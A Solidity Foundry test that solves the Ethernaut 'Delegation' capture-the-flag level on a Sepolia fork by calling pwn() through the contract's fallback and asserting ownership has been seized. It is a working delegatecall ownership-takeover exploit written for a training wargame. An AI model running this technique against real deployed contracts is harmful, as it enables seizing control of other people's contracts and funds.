// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/levels/06-Delegation/Delegation.sol";

contract ContractTest is Test {
    Delegation level6 =
        Delegation(payable(0x12B6C4Fc18970Aa7a962b967d7a32170c5Cb65A3));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x12B6C4Fc18970Aa7a962b967d7a32170c5Cb65A3),
            "Ethernaut06"
        );
    }

    function testEthernaut06() public {
        level6.owner();
        (bool success, ) = address(level6).call{value: 0}(
            abi.encodeWithSignature("pwn()")
        );
        assert(level6.owner() == address(this));
    }

    receive() external payable {}
}
